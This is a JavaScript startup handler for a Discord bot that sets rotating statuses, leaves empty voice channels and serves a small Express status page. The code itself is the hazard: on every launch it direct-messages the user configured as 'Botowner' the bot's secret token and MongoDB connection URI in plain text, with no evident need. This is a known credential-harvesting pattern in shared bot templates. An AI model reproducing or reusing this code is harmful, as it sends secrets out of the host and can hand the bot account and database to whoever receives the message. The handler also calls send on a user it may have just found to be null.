/*bot ready*/
module.exports = async client => {
	const Discord = require('discord.js');
	const express = require('express');
	const app = express();

	const { Botport, Botowner } = require('../../config/Bot.json');
	const { Arrowemoji } = require('../../config/Emoji.json');

	let botStatus = [
		`Online in ${client.guilds.cache.size} servers!`,
		`Watching ${client.guilds.cache.reduce(
			(c, g) => c + g.memberCount,
			0
		)} users!`,
		`Over ${client.emojis.cache.size} emojis!`
	];

	setInterval(function() {
		let member;
		client.guilds.cache.forEach(async guild => {
			await delay(15);
			member = await client.guilds.cache
				.get(guild.id)
				.members.cache.get(client.user.id);
			if (!member.voice.channel) return;
			if (member.voice.channel.members.size === 1) {
				return member.voice.channel.leave();
			}
		});

		let status = botStatus[Math.floor(Math.random() * botStatus.length)];
		client.user.setActivity(status, {
			type: 'STREAMING',
			url: 'https://www.twitch.tv/monstercat'
		});
	}, 2000);

	app.get('/', (req, res) =>
		res.send(`[${client.user.username} STATUS]: online`)
	);
	app.listen(Botport, () => {
		console.log(`\x1b[94m` + `[BOT HOSTING PORT]: ${Botport}`);
		console.log(`\x1b[92m` + `[${client.user.username}]: online now.`);
	});
	let arrowemoji = Arrowemoji;
	const user = await client.users.fetch(Botowner).catch(() => null);

	if (!user) console.log('Botowner not found!');
	await user
		.send({
			embed: {
				author: {
					name: `『 ${client.user.username} status 』: online`,
					icon_url: `${user.displayAvatarURL({ dynamic: true, size: 4096 })}`
				},
				description: `**Secret Mongouri:**\n<a:Arrow:${arrowemoji}>┊\`${process.env.mongouri}\`\n\n**Secret Current Bottoken:**\n<a:Arrow:${arrowemoji}>┊\`${process.env.token}\``,
				color: `74F4F3`,
				timestamp: new Date(),
				footer: {
					text: `Currently in ${
						client.guilds.cache.size
					} guilds with ${client.guilds.cache.reduce(
						(c, g) => c + g.memberCount,
						0
					)} users!`,
					icon_url: `${client.user.displayAvatarURL({
						dynamic: true,
						size: 4096
					})}`
				}
			}
		})
		.catch(() => {
			console.log('User has dm closed or has no mutual servers with the bot!');
		});
};

function delay(delayInms) {
	return new Promise(resolve => {
		setTimeout(() => {
			resolve(2);
		}, delayInms);
	});
}
/**/
